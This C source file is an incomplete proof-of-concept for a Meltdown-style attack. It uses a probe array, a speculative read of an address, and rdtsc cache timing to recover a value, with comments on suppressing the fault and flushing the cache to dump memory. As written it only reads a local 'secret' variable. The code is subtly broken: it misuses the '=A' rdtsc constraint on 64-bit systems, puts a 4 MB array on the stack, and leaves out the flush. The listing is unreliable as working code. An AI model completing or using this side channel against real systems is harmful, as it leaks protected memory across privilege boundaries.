#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <inttypes.h>

//Returns cpu cycles as unsigned integer
static inline uint64_t get_cycles(){
    uint64_t t;
    __asm volatile ("rdtsc" : "=A"(t));   
    return t; 
}

//Scan a memory address and retrieve results via side channel
int scan(int *addr){

    //Setup probe array of 256 memory pages
    int page_size = 4096;
    int page_number = 256;
    int array[page_size * page_number];

    //Speculative execution
    //  -raise exception (acsess protected memory)
    //  -handle exception or spawn child process to recover int
    //When executed out of order, data is thrown out but probe array[*addr * 4096] is cached
    int a = array[*addr * 4096];

    int i;

    //Cache hit statistics
    int min = 100000;
    int minI = 0;

    //Threshhold
    
    for(i = 0; i < page_number; i++){

        //Cycle times
        uint64_t c1, c2;

        //Cycles before access 
        c1 = get_cycles();

        //If cached this should take under 20 cycles
        int b = array[i * page_size];

        //Cycles after access
        c2 = get_cycles();

        int time = (int) (c2 - c1);

        //Update minimum min i directly corresponds to protected value accessed earlier
        if(time < min){
            min = time;
            minI = i;
        }        
    }
    return minI;
}

int main(void){
    
    //Sample secret values
    int secret = 8;
    int *addr = &secret;

    printf("Secret at %p\n", addr);

    //Scan at secret address
    //With speculation implemented this address could be anything and no seg fault would be raised
    //-note: to do this process repeatedly (memory dump), cache must be flushed before scanning
    int page = scan(addr);
    printf("Hit at %i\n", page);
}
